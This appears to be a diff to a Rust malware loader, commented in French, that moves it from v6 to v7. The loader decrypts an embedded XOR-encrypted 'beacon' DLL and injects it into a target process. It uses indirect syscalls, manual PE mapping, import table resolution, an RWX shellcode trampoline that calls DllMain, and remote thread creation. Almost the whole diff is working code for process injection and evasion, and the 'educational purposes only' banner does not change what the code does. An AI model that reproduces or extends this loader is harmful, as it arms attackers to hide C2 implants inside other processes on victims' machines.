@@ -1,6 +1,6 @@
 /*
     ============================================================
-    LOADER v6 - PE Loader Edition
+    LOADER v7 - PE Loader + IAT + Trampoline
     ============================================================
 
     Ce loader utilise le nouveau PE Loader de c2_common pour
@@ -11,6 +11,7 @@
     - Indirect syscalls (c2_common::syscalls)
     - Remote PE Loading (allocation + mapping + relocs + IAT)
     - Minimum process rights
+    - Trampoline pour DllMain
 
     USAGE EDUCATIF UNIQUEMENT
 */
@@ -37,24 +38,25 @@ macro_rules! debug_eprintln {
 // IMPORTS
 // ============================================================
 
+use c2_common::pe::{PeParser, IMAGE_ORDINAL_FLAG64};
 use c2_common::{obf_str, syscall};
-use c2_common::pe::PeParser;
 
 use libc::c_void;
+use std::ffi::CString;
 use std::ptr::null_mut;
 
 use ntapi::ntapi_base::CLIENT_ID;
 use ntapi::ntexapi::{SystemProcessInformation, PSYSTEM_PROCESS_INFORMATION};
 use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES};
 use winapi::shared::ntstatus::STATUS_SUCCESS;
+use winapi::um::libloaderapi::{GetProcAddress, LoadLibraryA};
 
 // ============================================================
 // CONSTANTES
 // ============================================================
 
 const PAGE_READWRITE: u32 = 0x04;
-#[allow(dead_code)]
-const PAGE_EXECUTE_READ: u32 = 0x20;
+const PAGE_EXECUTE_READWRITE: u32 = 0x40; // Nécessaire pour le trampoline
 const MEM_COMMIT_RESERVE: u32 = 0x3000;
 
 // Droits minimum pour injection
@@ -62,16 +64,16 @@ const PROCESS_CREATE_THREAD: u32 = 0x0002;
 const PROCESS_VM_OPERATION: u32 = 0x0008;
 const PROCESS_VM_WRITE: u32 = 0x0020;
 const PROCESS_VM_READ: u32 = 0x0010;
-const MINIMUM_ACCESS: u32 = PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
+const MINIMUM_ACCESS: u32 =
+    PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;
 
 // ============================================================
 // BEACON EMBARQUÉE
 // ============================================================
 
-// Beacon Discord chiffrée en XOR
-// Générer avec: python3 tools/xor_encrypt.py beacon.dll beacon.dll.enc
-const BEACON_BYTES_ENC: &[u8] = include_bytes!("../../test_dll/test_dll.dll.enc");
-const XOR_KEY: &[u8] = b"A";  // Clé XOR simple (0x41)
+// Beacon chiffrée en XOR (test_dll ou beacon.dll)
+const BEACON_BYTES_ENC: &[u8] = include_bytes!("../../beacon.dll.enc");
+const XOR_KEY: &[u8] = b"A"; // Clé XOR simple (0x41)
 
 /// Déchiffre la beacon au runtime
 #[inline(always)]
@@ -86,6 +88,40 @@ fn decrypt_beacon() -> Vec<u8> {
 // ============================================================
 // FONCTIONS HELPER
 // ============================================================
+
+/// Génère un shellcode trampoline pour appeler DllMain
+/// Arguments DllMain: (hinstDLL, fdwReason, lpvReserved)
+/// RCX est passé par NtCreateThreadEx (lpParameter = BaseAddress)
+fn generate_trampoline(entry_point_rva: u32) -> Vec<u8> {
+    let mut shellcode = Vec::new();
+
+    // 1. mov edx, 1 (DLL_PROCESS_ATTACH)
+    shellcode.extend_from_slice(&[0xBA, 0x01, 0x00, 0x00, 0x00]);
+
+    // 2. xor r8d, r8d (lpvReserved = NULL)
+    shellcode.extend_from_slice(&[0x45, 0x31, 0xC0]);
+
+    // 3. mov rax, rcx (rax = BaseAddress)
+    shellcode.extend_from_slice(&[0x48, 0x89, 0xC8]);
+
+    // 4. add rax, entry_point_rva (rax = EntryPoint)
+    shellcode.extend_from_slice(&[0x48, 0x05]);
+    shellcode.extend_from_slice(&entry_point_rva.to_le_bytes());
+
+    // 5. sub rsp, 0x28 (Align stack + Shadow space)
+    shellcode.extend_from_slice(&[0x48, 0x83, 0xEC, 0x28]);
+
+    // 6. call rax
+    shellcode.extend_from_slice(&[0xFF, 0xD0]);
+
+    // 7. add rsp, 0x28
+    shellcode.extend_from_slice(&[0x48, 0x83, 0xC4, 0x28]);
+
+    // 8. ret
+    shellcode.push(0xC3);
+
+    shellcode
+}
 
 /// Trouve le PID d'un processus par son nom
 fn find_process_pid(target_name: &str) -> Option<u32> {
@@ -138,13 +174,11 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
     debug_println!("[*] DLL size: {} bytes", dll_bytes.len());
 
     // Parser la DLL pour obtenir les infos nécessaires
-    let pe = PeParser::parse(dll_bytes)
-        .map_err(|e| format!("PE parse error: {}", e))?;
+    let pe = PeParser::parse(dll_bytes).map_err(|e| format!("PE parse error: {}", e))?;
 
     debug_println!("[*] PE parsed successfully");
     debug_println!("    Image size: {} bytes", pe.size_of_image());
     debug_println!("    Entry point RVA: 0x{:X}", pe.entry_point_rva());
-    debug_println!("    Sections: {}", pe.sections.len());
 
     unsafe {
         // =====================================================
@@ -220,7 +254,9 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
                     section.size_of_raw_data as usize,
                     section.virtual_size as usize,
                 );
-                if src_offset + copy_size <= dll_bytes.len() && dest_offset + copy_size <= mapped_image.len() {
+                if src_offset + copy_size <= dll_bytes.len()
+                    && dest_offset + copy_size <= mapped_image.len()
+                {
                     mapped_image[dest_offset..dest_offset + copy_size]
                         .copy_from_slice(&dll_bytes[src_offset..src_offset + copy_size]);
                 }
@@ -254,8 +290,87 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
                 }
             }
         }
+        debug_println!("[+] Image mapped and relocated");
 
-        debug_println!("[+] Image mapped and relocated locally");
+        // =====================================================
+        // ÉTAPE 3.5: Resolve Imports (IAT)
+        // =====================================================
+        debug_println!("\n[STEP 3.5] Resolve Imports");
+
+        if pe.has_imports() {
+            for (desc, dll_name) in pe.iter_imports() {
+                // Charger la DLL (dans le loader local) pour avoir son handle
+                // Comme on est sur la même machine, les adresses des DLL système sont identiques
+                let dll_cstr = match CString::new(dll_name) {
+                    Ok(s) => s,
+                    Err(_) => continue,
+                };
+
+                let h_module = LoadLibraryA(dll_cstr.as_ptr());
+                if h_module.is_null() {
+                    debug_eprintln!("[!] Failed to load DLL: {}", dll_name);
+                    continue;
+                }
+
+                // Itérer sur les thunks (ILT)
+                let mut thunk_rva = desc.original_first_thunk;
+                if thunk_rva == 0 {
+                    thunk_rva = desc.first_thunk;
+                }
+
+                let mut iat_rva = desc.first_thunk;
+
+                loop {
+                    // Lire le thunk data (u64)
+                    let thunk_data: u64 = match pe.read_struct_at_rva(thunk_rva) {
+                        Some(val) => val,
+                        None => break,
+                    };
+
+                    if thunk_data == 0 {
+                        break;
+                    }
+
+                    let func_addr: u64;
+
+                    // Vérifier si import par ordinal ou nom
+                    if (thunk_data & IMAGE_ORDINAL_FLAG64) != 0 {
+                        // Import par ordinal
+                        let ordinal = (thunk_data & 0xFFFF) as u64;
+                        func_addr = GetProcAddress(h_module, ordinal as *const i8) as u64;
+                    } else {
+                        // Import par nom
+                        let name_rva = (thunk_data & 0x7FFFFFFF) as u32;
+                        // hint (2 bytes) + name (ascii)
+                        // On saute le hint
+                        if let Some(func_name) = pe.read_cstr_at_rva(name_rva + 2) {
+                            if let Ok(func_cstr) = CString::new(func_name) {
+                                func_addr = GetProcAddress(h_module, func_cstr.as_ptr()) as u64;
+                            } else {
+                                func_addr = 0;
+                            }
+                        } else {
+                            func_addr = 0;
+                        }
+                    }
+
+                    // Écrire l'adresse résolue dans l'IAT de l'image mappée
+                    if func_addr != 0 {
+                        let iat_offset = iat_rva as usize;
+                        if iat_offset + 8 <= mapped_image.len() {
+                            let iat_ptr = mapped_image.as_mut_ptr().add(iat_offset) as *mut u64;
+                            *iat_ptr = func_addr;
+                        }
+                    } else {
+                        debug_eprintln!("[!] Failed to resolve import from {}", dll_name);
+                    }
+
+                    thunk_rva += 8;
+                    iat_rva += 8;
+                }
+            }
+            debug_println!("[+] Imports resolved (Local IAT patching)");
+        }
 
         // =====================================================
         // ÉTAPE 4: NtWriteVirtualMemory
@@ -284,7 +399,8 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
         debug_println!("\n[STEP 5] NtProtectVirtualMemory (per section)");
 
         for section in &pe.sections {
-            let section_addr = (base_address as usize + section.virtual_address as usize) as *mut c_void;
+            let section_addr =
+                (base_address as usize + section.virtual_address as usize) as *mut c_void;
             let mut section_size = section.virtual_size as usize;
             let protection = section.to_protection();
             let mut old_protect: u32 = 0;
@@ -299,36 +415,76 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
             );
 
             if status != STATUS_SUCCESS {
-                debug_eprintln!("[!] Warning: Failed to protect section {}: {:#X}", 
-                    section.name_str(), status);
+                debug_eprintln!(
+                    "[!] Warning: Failed to protect section {}: {:#X}",
+                    section.name_str(),
+                    status
+                );
             } else {
                 debug_println!("[+] Protected {} (0x{:X})", section.name_str(), protection);
             }
         }
 
         // =====================================================
-        // ÉTAPE 6: NtCreateThreadEx → Entry Point
+        // ÉTAPE 6: Trampoline & Execution
         // =====================================================
-        debug_println!("\n[STEP 6] NtCreateThreadEx");
+        debug_println!("\n[STEP 6] Allocating & Writing Trampoline");
 
-        let entry_point = (base_address as usize + pe.entry_point_rva() as usize) as *mut c_void;
-        debug_println!("[*] Entry point: {:p}", entry_point);
+        let trampoline_code = generate_trampoline(pe.entry_point_rva());
+        let mut trampoline_base: *mut c_void = null_mut();
+        let mut trampoline_size: usize = trampoline_code.len(); // Taille exacte ou page ?
+                                                                // NtAllocateVirtualMemory arrondit à la page, donc c'est OK
 
+        let status: NTSTATUS = syscall!(
+            "NtAllocateVirtualMemory",
+            h_process,
+            &mut trampoline_base as *mut _ as *mut _,
+            0usize,
+            &mut trampoline_size as *mut usize,
+            MEM_COMMIT_RESERVE,
+            PAGE_EXECUTE_READWRITE // RWX pour simplifier le POC (Write puis Exec)
+        );
+
+        if status != STATUS_SUCCESS {
+            let _: NTSTATUS = syscall!("NtClose", h_process);
+            return Err(format!("Failed to allocate trampoline: {:#X}", status));
+        }
+        debug_println!("[+] Trampoline allocated at: {:p}", trampoline_base);
+
+        // Écrire le trampoline
+        let status: NTSTATUS = syscall!(
+            "NtWriteVirtualMemory",
+            h_process,
+            trampoline_base,
+            trampoline_code.as_ptr() as *const c_void,
+            trampoline_code.len(),
+            &mut bytes_written as *mut usize
+        );
+
+        if status != STATUS_SUCCESS {
+            let _: NTSTATUS = syscall!("NtClose", h_process);
+            return Err(format!("Failed to write trampoline: {:#X}", status));
+        }
+
+        debug_println!("\n[STEP 7] NtCreateThreadEx (via Trampoline)");
+
+        // Créer le thread pointant sur le trampoline
+        // lpParameter (RCX) = base_address (Handle DLL pour DllMain)
         let mut thread_handle: *mut c_void = null_mut();
 
         let status: NTSTATUS = syscall!(
             "NtCreateThreadEx",
             &mut thread_handle as *mut _ as *mut _,
-            0x1FFFFFu32,  // THREAD_ALL_ACCESS
+            0x1FFFFFu32, // THREAD_ALL_ACCESS
             NULL,
             h_process,
-            entry_point,
-            base_address,  // lpParameter = base address (pour DllMain)
-            0u32,          // CreateFlags
-            0usize,        // ZeroBits
-            0usize,        // StackSize
-            0usize,        // MaxStackSize
-            NULL           // AttributeList
+            trampoline_base, // StartAddress = Trampoline
+            base_address,    // lpParameter = Base Address (passé dans RCX)
+            0u32,            // CreateFlags
+            0usize,          // ZeroBits
+            0usize,          // StackSize
+            0usize,          // MaxStackSize
+            NULL             // AttributeList
         );
 
         if status != STATUS_SUCCESS {
@@ -340,7 +496,7 @@ fn inject_pe_remote(target_pid: u32, dll_bytes: &[u8]) -> Result<(), String> {
         // =====================================================
         // CLEANUP
         // =====================================================
-        debug_println!("\n[STEP 7] Cleanup");
+        debug_println!("\n[STEP 8] Cleanup");
         let _: NTSTATUS = syscall!("NtClose", thread_handle);
         let _: NTSTATUS = syscall!("NtClose", h_process);
         debug_println!("[+] Handles closed");
@@ -357,13 +513,14 @@ fn main() {
     debug_println!(
         r#"
     ╔═══════════════════════════════════════════════════════════╗
-    ║   LOADER v6 - PE Loader Edition                           ║
+    ║   LOADER v7 - PE Loader + IAT + Trampoline                ║
     ║                                                           ║
     ║  Techniques:                                              ║
-    ║  ✓ Full PE Loading (parse, map, reloc, IAT)               ║
+    ║  ✓ Full PE Loading (parse, map, reloc)                    ║
+    ║  ✓ IAT Resolution (same-machine injection)                ║
     ║  ✓ Indirect syscalls                                      ║
     ║  ✓ Minimum process rights                                 ║
-    ║  ✓ Per-section memory protection                          ║
+    ║  ✓ DllMain Trampoline (arguments correction)              ║
     ║                                                           ║
     ║    FOR EDUCATIONAL PURPOSES ONLY                          ║
     ╚═══════════════════════════════════════════════════════════╝
